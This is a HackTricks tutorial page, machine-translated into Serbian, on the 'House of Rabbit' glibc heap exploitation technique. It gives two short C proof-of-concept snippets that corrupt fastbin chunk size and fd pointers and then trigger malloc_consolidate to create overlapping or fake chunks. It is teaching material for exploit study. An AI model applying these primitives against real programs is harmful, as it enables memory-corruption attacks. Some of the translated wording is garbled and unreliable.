# Ku캖a Zeca

{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS-a: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stru캜njak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stru캜njak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

### Zahtevi

1. **Sposobnost modifikacije pokaziva캜a fd brze binarne ili veli캜ine**: To zna캜i da mo쬰te promeniti pokaziva캜 napred jednog bloka u brzoj binarnoj ili njegovu veli캜inu.
2. **Sposobnost pokretanja `malloc_consolidate`**: Ovo se mo쬰 posti캖i ili dodeljivanjem velikog bloka ili spajanjem vr코nog bloka, 코to prisiljava hip da konsoliduje blokove.

### Ciljevi

1. **Stvaranje preklapaju캖ih blokova**: Da bi jedan blok prekrio drugi, omogu캖avaju캖i dalje manipulacije hipom.
2. **La쬴ranje la쬹ih blokova**: Da bi se varalica ubedio da tretira la쬹i blok kao legitimni blok tokom operacija hipa.

## Koraci napada

### POC 1: Modifikacija veli캜ine brze binarne jedinice

**Cilj**: Stvaranje preklapaju캖eg bloka manipulacijom veli캜ine brze binarne jedinice.

* **Korak 1: Dodela Blokova**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Korak 2: Osloba캠anje delova**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **Korak 3: Izmena Veli캜ine 캛unka**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **Korak 4: Izazovite `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Alociranje velikog bloka pokre캖e funkciju `malloc_consolidate`, spajaju캖i male blokove u brzom binu. Manipulisana veli캜ina `chunk1` uzrokuje preklapanje sa `chunk2`.

Nakon konsolidacije, `chunk1` se preklapa sa `chunk2`, omogu캖avaju캖i dalju eksploataciju.

### POC 2: Modifikacija `fd` pokaziva캜a

**Cilj**: Kreiranje la쬹og bloka manipulacijom brzog bin `fd` pokaziva캜a.

* **Korak 1: Alociranje Blokova**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Obja코njenje**: Alociramo dva bloka, jedan manji i jedan ve캖i, kako bismo postavili hip za la쬹i blok.

* **Korak 2: Kreiranje la쬹og bloka**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Korak 3: Oslobodite `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Obja코njenje**: Osloba캠amo `chunk1`, dodaju캖i ga u listu fastbin.

* **Korak 4: Modifikujemo `fd` od `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Obja코njenje**: Menjamo pokaziva캜 unapred (`fd`) `chunk1` da pokazuje na na코 la쬹i blok unutar `chunk2`.

* **Korak 5: Pokretanje `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Alociranje velikog bloka ponovo pokre캖e `malloc_consolidate`, koji obra캠uje la쬹i blok.

La쬹i blok postaje deo liste brzih binova, 캜ine캖i ga legitimnim blokom za dalje iskori코캖avanje.

### Rezime

Tehnika **House of Rabbit** uklju캜uje ili modifikovanje veli캜ine bloka brzih binova kako bi se stvorili preklapaju캖i blokovi ili manipulisanje `fd` pokaziva캜a kako bi se stvorili la쬹i blokovi. Ovo omogu캖ava napada캜ima da falsifikuju legitimne blokove u hipu, omogu캖avaju캖i razli캜ite oblike iskori코캖avanja. Razumevanje i ve쬭anje ovih koraka 캖e unaprediti va코e ve코tine iskori코캖avanja hipa.
